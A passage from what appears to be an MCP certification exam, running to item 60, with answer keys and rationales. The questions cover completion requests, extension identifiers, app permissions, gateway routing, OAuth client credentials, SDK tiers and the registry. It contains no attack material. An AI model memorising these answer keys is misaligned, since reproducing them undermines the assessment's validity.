A. A subscriptions/listen stream that pushes every repository name to the client in advance\
B. The completion/complete request, which returns suggested values for a prompt argument\
C. An elicitation/create request that the host sends to the server for every character typed\
D. A resources/list call on every keystroke, filtered by the host down to repository names

<details><summary>정답</summary>

B. Argument completion is the utility built for this: the host calls completion/complete with a reference to the prompt and the partial argument value, and the server returns up to 100 suggested values. Listing resources or streaming notifications is not a completion mechanism, and elicitation is a server request for user input, not a host lookup against the server.

</details>

## 51. [use-cases-and-ecosystem]

A third-party extension published as com.example/my-extension makes a breaking change to its wire format. The maintainer wants integrations built against the old behavior to keep working unmodified. What should the maintainer do?

A. Keep the same identifier, since extension identifiers are versioned automatically behind the scenes\
B. Remove the old identifier entirely so no client can accidentally negotiate the outdated behavior\
C. Publish the breaking change under a new identifier, such as com.example/my-extension-v2, rather than reusing the old one\
D. Keep the same identifier, since every client is required to renegotiate extensions on each request anyway

<details><summary>정답</summary>

C. A breaking change to an extension needs a new identifier so old and new behavior can be negotiated and run side by side, since identifiers are not automatically versioned and removing the old one outright would break every integration still relying on it instead of only the ones that opt in.

</details>

## 52. [use-cases-and-ecosystem]

An MCP Apps interface asks for camera access by including camera in its permissions metadata, and the app's developer assumes the camera will now be available inside the sandboxed iframe. Is that assumption correct?

A. No, because permissions metadata only ever applies to network access, never device hardware\
B. Yes, but only for microphone and geolocation, never specifically for camera\
C. Yes, since declaring a permission in that metadata field is what grants it immediately\
D. No, since the host may honor a requested permission but the app should never assume it was actually granted

<details><summary>정답</summary>

D. Permissions such as camera, microphone, geolocation, and clipboardWrite are requests the host may choose to honor, not guarantees, so a well-behaved app treats a declared permission as optional and checks at runtime rather than assuming the capability is present just because it was requested.

</details>

## 53. [use-cases-and-ecosystem]

A platform team is putting a gateway in front of several internal MCP servers so client requests can be routed without the gateway parsing every request body. What should the gateway route on?

A. The Mcp-Method and Mcp-Name headers, validating them against the body rather than trusting them blindly\
B. The clientInfo field inside the request metadata, since it uniquely identifies which server should handle the request\
C. The JSON-RPC id, since ids encode which server originally issued them\
D. The cacheScope field, since it was designed to carry routing information

<details><summary>정답</summary>

A. The required headers exist precisely so a gateway can route and enforce policy without parsing every body, but it must still validate that the headers agree with the body and reject a mismatch, rather than routing on clientInfo, which is self-reported, or on fields never meant for routing.

</details>

## 54. [use-cases-and-ecosystem]

A team preparing for a production launch wants one end-to-end rehearsal that exercises discovery, a validated tool call, a consent round trip, and audit logging together, rather than testing each in isolation. What kind of exercise does this describe?

A. A registry namespace verification check performed once before any server is first published\
B. An integrated readiness rehearsal spanning discovery, execution, consent, and audit together\
C. A load test that only measures raw requests successfully processed per second overall\
D. A narrow unit test that only exercises a single JSON Schema validator function

<details><summary>정답</summary>

B. Rehearsing one full exchange that touches discovery, validated tool execution, MRTR consent, and audit logging together is an integrated readiness check spanning every domain, which is a different exercise from a narrow unit test, a pure throughput load test, or a registry ownership check.

</details>

## 55. [use-cases-and-ecosystem]

A team is connecting a nightly batch job, with no human present, to an MCP server for a machine-to-machine integration. Ordinary user-facing OAuth consent screens do not fit this case. What should the team reach for?

A. URL-mode elicitation, since it is specifically designed for out-of-band human approval\
B. A server-minted handle, since such handles fully replace authorization for automated batch clients\
C. The OAuth Client Credentials extension, built for machine-to-machine clients such as CI or daemons\
D. Dynamic Client Registration, since it removes the need for any authorization at all

<details><summary>정답</summary>

C. The OAuth Client Credentials extension is built for machine-to-machine clients like CI jobs and daemons that have no human present to complete an interactive consent flow, unlike elicitation which needs a human, DCR which only registers a client rather than removing authorization, or handles which address state, not identity.

</details>

## 56. [use-cases-and-ecosystem]

A platform team is choosing an SDK to build a new production MCP server and wants strong guarantees about spec conformance and how fast critical bugs get fixed. Which SDK tier should they prefer, all else equal?

A. Tier 3, since experimental SDKs get the newest features first\
B. Whichever tier has the largest download count, since popularity is the only signal that matters\
C. Tier 2, since an 80 percent conformance pass rate is the ecosystem norm\
D. Tier 1, since it passes full conformance tests and commits to fast triage and bug fixes

<details><summary>정답</summary>

D. SDK tiering gives Tier 1 the strongest guarantees, full conformance test passage plus fast triage and critical bug fix commitments, which matters directly for a production deployment, while Tier 2 accepts a lower conformance bar and Tier 3 is explicitly experimental regardless of its download popularity.

</details>

## 57. [use-cases-and-ecosystem]

A working group wants to incubate a new MCP extension in the open before proposing it as an official one. Where does that early work belong under the extensions process?

A. In an experimental-ext- repository owned by a Working Group or Interest Group\
B. Directly inside the core specification's draft, since every extension starts as a core feature\
C. In any private fork, since extensions need no public process before clients adopt them\
D. Under the io.modelcontextprotocol prefix right away, since official status comes with publication

<details><summary>정답</summary>

A. Experimental extensions live in repositories with the experimental-ext- prefix that belong to a Working Group or Interest Group; becoming official goes through an Extensions Track SEP with a reference implementation in an official SDK and review by the Core Maintainers. The io.modelcontextprotocol prefix is not claimed by publishing, and extensions stay out of the core specification.

</details>

## 58. [use-cases-and-ecosystem]

An aggregator team plans to mirror the official MCP Registry into its own catalog for customers. What does the registry's current status tell the team to plan for?

A. A mandatory security scan of every package, since the registry certifies server code\
B. Breaking changes or data resets before general availability, since the registry is in preview\
C. Paid access tiers, since mirroring the registry requires a commercial license agreement\
D. Nothing special, since the registry is generally available with a frozen data model

<details><summary>정답</summary>

B. The MCP Registry is in preview, and its maintainers warn that breaking changes or data resets may happen before general availability, so an aggregator should design for re-syncs and schema changes. The registry hosts metadata and delegates security scanning to package registries and downstream aggregators; it does not certify server code.

</details>

## 59. [use-cases-and-ecosystem] (복수 정답)

A host developer is implementing support for the MCP Apps extension and reading how the UI resource's own metadata constrains the sandboxed iframe. Which three statements are correct? Select three.

A. The UI resource is fetched through an ordinary resources/read call and carries the mime type text/html;profile=mcp-app\
B. When the UI resource's metadata omits csp entirely, the host must apply a restrictive default that blocks outgoing connections\
C. Requesting camera or microphone access through the permissions metadata grants it automatically without any host involvement\
D. The UI resource's csp metadata is an object of domain lists, such as connectDomains and frameDomains, not one flat list of allowed origins

<details><summary>정답</summary>

A, B, D. The csp metadata on the UI resource is structured as domain-list fields such as connectDomains, resourceDomains, frameDomains, and baseUriDomains rather than a flat origin list, an omitted csp forces a restrictive default that blocks outgoing connections, and the resource itself is retrieved with a normal resources/read call carrying the mcp-app HTML profile. Permissions such as camera and microphone are never granted automatically just because an app asks for them.

</details>

## 60. [use-cases-and-ecosystem] (복수 정답)

A capstone readiness review is checking whether a team's end-to-end rehearsal actually covers the full 2026-07-28 surface before certification. Which three elements should the rehearsal include? Select three.

A. Audience validation of the token presented for the server, rejecting one issued for another resource\
B. A legacy initialize handshake, kept in the main request path so both eras share one code path\
C. Trace context propagated end to end so the exchange can be attributed and reviewed afterward\
D. An MRTR consent round trip using a new request id and an integrity-protected requestState

<details><summary>정답</summary>

A, C, D. A thorough readiness rehearsal exercises a proper MRTR consent round trip, strict audience validation against token misuse, and end-to-end trace propagation for auditability. A legacy initialize handshake does not belong in the 2026-07-28 main path, since that request was removed rather than kept as a shared code path.

</details>
